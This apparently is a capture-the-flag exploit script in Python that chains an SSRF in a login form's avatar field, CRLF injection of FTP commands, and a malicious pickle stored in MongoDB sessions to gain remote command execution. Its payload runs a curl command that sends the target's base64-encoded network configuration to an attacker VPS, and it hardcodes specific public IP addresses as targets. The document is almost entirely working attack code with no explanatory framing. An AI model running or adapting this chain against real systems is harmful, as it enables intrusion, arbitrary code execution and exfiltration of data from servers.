from pymongo import MongoClient
import pickle
import os

def get_pickle(cmd):
    class exp(object):
        def __reduce__(self):
            return (os.system, (cmd,))
    return pickle.dumps(exp())

def get_mongo(cmd):
    client = MongoClient('localhost', 27017)
    coll = client.admin.sessions
    try:
        coll.update_one(
            {'id':'session:37386ce1-3fe8-4f1d-91fc-224581c5279f'},
            {"$set": { "val": get_pickle(cmd) }},
            upsert=True
        )
    except Exception as e:
        return e.message

if __name__ == '__main__':
    print(get_mongo('ls'))



##########################################################################



from base64 import b64decode
import requests
import socket
import string
import random
import threading


def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])


def get_port_cmd(host):
    host, port = host.split(':')
    port = int(port)
    return 'PORT ' + ','.join(host.split('.') + [str(port // 256), str(port - port // 256 * 256)])


a = 'http://52.163.52.206:8088'
a = 'http://23.98.68.11:8088'

ftpd = '172.20.0.2:8877'
redis = '172.20.0.4:6379'
mongo = '172.20.0.5:27017'

bind = 'vps_ip:2334'
targ = mongo

##############################################

from mongo import get_mongo
request = get_mongo('curl vps_ip:1234/ -H "Host: `ip a|base64`"')


def ssrf(url):
    page = requests.post(a + '/login', data={
        'username': get_random_id(),
        'password': get_random_id(),
        'avatar': url,
        'submit': 'Go!'
    }).text
    page = page[page.find('data:image/png;base64,') +
                len('data:image/png;base64,'):]
    page = page[:page.find('"')]
    try:
        page = b64decode(page).decode()
    except:
        page = b64decode(page)
    return page

def inject(cmd):
    cmd = '\r\n'.join(cmd)
    return ssrf(f'''ftp://fan:root{cmd}@{ftpd}/''')

def sendfile(file):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', int(bind.split(':')[1])))
    sock.listen(1)
    (client, address) = sock.accept()
    print('accepted', address)
    client.send(file)
    print('sent')
    client.close()


thread = threading.Thread(target=sendfile, args=(request,))
thread.start()

print(ssrf(f'ftp://fan:root@{ftpd}/'))

inject(['TYPE I', get_port_cmd(bind), 'STOR frankli'])
thread.join()
print('uploaded')
print(ssrf(f'ftp://fan:root@{ftpd}/'))
print('replaying')
inject(['TYPE I', get_port_cmd(targ), 'RETR frankli'])
print('replayed')
print(requests.get(a, cookies={'session': '1eb74496-98b9-4acc-94fb-75ba15ddb803'}).headers)
print('requested')
inject(['RNFR frankli', 'RNTO trash'])
print(ssrf(f'ftp://fan:root@{ftpd}/'))

